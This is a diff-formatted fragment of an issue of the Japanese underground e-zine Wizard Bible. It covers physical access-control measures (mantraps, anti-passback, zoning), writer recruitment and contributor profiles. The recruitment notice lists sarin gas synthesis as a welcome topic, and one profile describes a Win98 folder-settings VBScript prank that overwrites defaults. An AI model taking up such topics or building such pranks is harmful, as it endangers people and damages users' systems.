+なり、必要な対策が実施された状態へと自然に移行できると考えられる。
+　よって、ビルディングパーミッション手続きを導入することは、現行の情報シ
+ステムを最も安価に背キュアな状態に移行させるための現実的な方法といえる。
+・ビルディングパーミッションを実施するタイミングをエンゲージメントレビュ
+ーポイント（engagement reviews points）と呼ぶ。
+　システムの開発過程の要所ごとに実施するのが一般的。企画段階、基本設計も
+しくは外部設計終了段階、詳細設計もしくは内部設計終了段階、プログラム開発
+終了段階、プロトタイプの完成段階などのシステム開発の節目ごとに実施する。
+大規模なシステムではビルディングパーミッションの結果、要求される仕様変更
+が非常に大きな開発のやり直しに繋がる可能性が高いので、開発のできるだけ早
+い段階から実施することが望ましい。
+・ビルディングパーミッション手続きを効率よく行うためには、セキュリティを
+考慮した設計標準（ガイドライン）を整備しておく必要がある。設計標準には、
+採用されるべきオプトイン方式、Webアプリケーションプログラミング規約、Coo
+kieの利用規約、リンクやフレームの張り込みに関する審査手続きなどを定めてお
+く必要がある。
+
+●ゾーニングシステム（zoning system）
+
+・守ろうとする資産の重要性に応じて物理的に区画をわけ、その区画への入室を
+許可されている者のみが入室できるようにする仕組みのことである。
+・セキュリティ区画の設定と入退室管理は、ゾーニングシステムを使って行う。
+重要性の高い情報資産を取り扱っている区画への入室には、セキュリティゲート
+の通過を義務付けるなどの措置を講じる。例えば、コールセンターのアウトソー
+シング業のような場合は、顧客ごとに別々にセキュリティ区画を設定することが、
+さらなる要件として加わる。
+・ゾーニングでは、セキュリティレベルという概念を使って区画ごとに入室審査
+基準を設ける。一般に、ゾーニングシステムにおけるセキュリティレベルは5～6
+段階で定義する。
+・アクセス制限区画には、当該区画を管理する管理責任者を置く。
+　入室するには、区画の管理責任者の許可を受けるようにする。
+・IDC（インターネットデータセンター）などでこの仕組みが採用されることが多
+い。
+
+●トラップドア（trap door）
+
+・最高セキュリティレベルの部屋に入る前の小部屋で、認証を受けた本人だけが
+進める。・トラップに入る手前で本人認証を行う。大抵は、入室を許可された者
+がIDカードのような身分証明バッジ（Identification Badge）の提示やパスワー
+ド入力を行うことで本人認証を受ける。認証が終わると、トラップに入るための
+ドアがまず開錠される。トラップに入室すると、先に開錠されたドアが施錠され、
+トラップ内の人間が一人のみであることが確認された後、初めて目的のセキュリ
+ティ区画へのドアが開錠される。
+　トラップドアが採用されていない場合、入室を許可された者が身分証明バッジ
+やパスワード入力を行った後、無許可の者を招き入れたり、身分証明バッジの携
+帯電話を忘れた者を入室させたりといった事態が発生する。
+・非常に厳格な入退室管理が要求される場合は、トラップドアの周辺をモニター
+カメラで監視したり、トラップ内で磁器媒体の検出を行うと共に、体重を測定し
+入室時と退室時の体重差で機密書類や磁器媒体の持ち出しを検出する仕組みが採
+用されている。
+
+●アンチパスパック機能
+
+・2回連続して入室できず、また2回連続して退室できない機能のこと。
+・共連れ（一人の認証で、複数人が出入りする行為）やすれ違いを防止する。
+
+●ペアオペレーションルール
+
+・2人以上が同時に入室しなければ開錠されない仕組み。
+　例えば、あらかじめ入室が許可された者2人が同時に、それぞれ指紋認証装置で
+本人認証されて初めて開錠される仕組みである。
+・原則として、最高セキュリティレベルの区画に部外者の入室が許可されること
+はない。
+
+●監視カメラ、防犯カメラ
+
+・警備室から終日監視というキーワードが出たら、監視カメラを示唆する。
+・建物の出入口、コンピュータ室内および通路の要所に監視カメラを設置する。
+
+●入退館（室）
+
+・情報システムの集中、分散処理の形態に応じ、情報システムなどを設置した建
+物および室の入退館および入退室の資格付与細則を定める。
+・建物および室の入退者に対しては、資格審査を行い、資格識別証を発行し、入
+退館および入退室を管理する。
+・一時的に入退館および入退室の資格を与えた者は、必要に応じた立会人を付け、
+立入場所の抑制を行う。
+・建物または室の重要度に応じ、入退の記録を取る。
+・出入口の施錠および解錠、鍵の保管および受渡しなどの記録を取り、鍵管理を
+行う。
+
+●搬出入物
+
+・情報システムなどの運用に関連する各室の搬出入物は、必要な物に限定する。
+・搬出入物は内容を確認し、記録を取る。
+
+●携帯電話
+
+・パスワードロックを行う。
+　しかし、携帯電話のデータ吸出しソフトにあるブルートフォースアタック機能
+でパスワードロックのパスワードを解析することができる。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第9章：お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://akademeia.info/wizardbible/）では随時、執筆ライタ
+ーを募集しています。
+　扱う内容のテーマは広義での「under ground」です。例えば、ハッキングから
+サリンガスの合成法などと幅広い内容を考えています。また、各種、特殊な職業
+や趣味を持った方のレクチャーなども含まれます。
+　一回きりでも構いません。また、必ず、毎回連載する義務もありませんのでで
+きる範囲で構いません。気軽に声をかけてください。もちろん一回書いたことが
+ある人も気軽に声をかけてください（全く気にしていない性格なので）。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://akademeia.info/wizardbible/wbQandA.html
+
+○支援者、参加希望者用のスレッドを立てました。
+
+http://ruffnex.oc.to/ipusiron/cgi/forum/patio.cgi?mode=view&no=17
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第10章：著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■Zer0real
+●Job:職業クラッカー
+●Web:http://ezhack.com/
+●Mail:zer0real2000@yahoo.co.jp
+●Team（Group):EZ Hackers Team
+●Comment:
+　おいおい、ホントにタダ働きだぜ、まったく…。ジャッカル師匠が海外逃亡中
+（苦笑）。WBはいつも見てるといってたけどな。
+
+
+■Will
+●Job:Student
+●Web:http://will.wbjapan.com/
+●Mail:will_net@hotmail.co.jp
+●Team（Group): Anti-WMAC
+
+
+■Narusase
+●Job: Student
+●Web: (裏)雑学の博物館（http://k-o-m.hp.infoseek.co.jp/）
+●Mail: narusase@mcn.ne.jp
+●Team（Group): N/A
+●Comment:
+　こんにちわ、Narusase（ナルサス）です。今回はサーバ兼ルーターが締め切り
+当日に逝ってしまいました（汗。今回はハニーポットの起動方法＆設定の話（後
+編）でした。ちょっとした問題を出題してみたので、もし良かったら解いてみて
+くださいな…。
+　今月は特に大きな締め切りもなく結構ゆったりと過ごせましたが、来月はかな
+り忙しそうです。落とさないように頑張らねば…（笑。
+　来月末は北九州の方にちょっと行ってきます、某WIDE関係の方が何名か参加す
+る集まりなので今から期待に胸をふくらませています。面白い話とか聞けるとい
+いな～（笑。
+　サイトの方はまあ、ヘタレな文章と、未熟な技術、ヘボいプログラムを紹介す
+るサイトということで、暇があったらあら探しでもしてみてください。誤植とか
+ミスとかはBBSにでも書いてくだされば、こっそり修正しときます（笑。
+
+
+■PSY
+●Job:IT関係、作家
+●Web:psy.ktplan.ne.jp/seven.htm
+●Mail:psy@m4.ktplan.ne.jp
+●Team（Group）:none
+●Comment:
+　2回目の投稿です。今回は簡単な悪戯ツールを投稿してみました。
+　悪戯ツールといえば、Win98が出たころにちょこっと作ってみたことがあります。
+だってホラ。あの、フォルダのカスタマイズ機能！　設定ファイル上でVBScript
+が動いてしまうんですから！　セキュリティはどうなんじゃと、正直驚きでした
+よ。
+　早速あれこれ試してみました。お気に入りは、フォルダを開いてファイルをク
+リックすると、「ファイルはいただいたぜ。hehehe」とか表示されてファイルが
+（見かけ上）消え、フォルダ一面ドクロマークで覆われるというヤツ。悪ノリし
+て、ZIPを解凍しただけでデフォルト設定を上書きしてしまい、（バイナリエディ
+タで相対パス⇒絶対パスに変換すればOK）ついでに起動画面もドクロマークにな
+るようなファイルを作ったりもしました。なかなかイケてると自分じゃ思いまし
+たが、結局誰にも仕掛けずじまい。なぜって、元の設定のバックアップが取れな
+かったから。（上書きするだけですからね！）デフォルトの設定いじってる人も
+少ないでしょうが、人様のファイルを破壊してしまうのはポリシーに反します。
+　今回はバッチファイルにして復旧ツールもつけてみました。
+　物足りない方もいるかもしれませんが、ま、初心者に優しい講座ということで
+……。
+
+
+■右サイド
+●Job:Student
+●Web:右サイド（http://www3.pf-x.net/~right-hand-side/）
+●Mail:right-hand-side@mail3.pf-x.net
+●Team（Group）:N/A
+
+
+■Defolos
+●Job:Student
+●Web:http://ruffnex.oc.to/defolos/
+●Mail:defolos@ruffnex.oc.to
+●Team（Group）:none
+●Comment:
+　おはようございました、Defolosです。ピッキングとナイフメーキング、PCなど
+が趣味のごく普通の学生です。
+　今回WizardBibleへの参加が10回目となりましたので、記念に普段書かない分野
+についてまとめてみました。身の程知らずにも、プログラマーでもないくせにシ
+グナルについて書きましたので、間違ってる点がある可能性があります。誤りを
+見つけてくれた方はご報告いただければうれしく思います。
+　それでは、来週またお会いしましょう。
+
+
+■Kenji Aiko
+●Job: Student
+●Web: http://ruffnex.oc.to/kenji/
+●Mail: kenji@ruffnex.oc.to
+●Team（Group): N/A
+●Comment:
+　最近ビートルズをよく聞きます。ビートルズ良いですね。「CAN'T BUY ME LOV
+E」「A HARD DAY'S NIGHT」「PAPERBACK WRITER」「LADY MADONNA」「LET IT BE
+」時代に関係なく良い曲ってのはあるんだなぁと実感しました。
+
+
+■IPUSIRON
+●Job:隙間産業関係
+●Web:http://akademeia.info/
+●Mail:ipusiron@ruffnex.oc.to
+●Team（Group): ruffnex,backsection
+●Comment:
+　レンサバ移転、ドメイン移管もうまくいき、とりあえず容量を気にせずに更新
+していけそうです。動画やツールも積極的にアップしていこうと思います。今後
+ともアカデメイアやWizard Bibleをよろしくお願いします。
+↓最近更新をがんばっている講座
+http://akademeia.info/main/lecture3/tokubetu_picking.htm
+
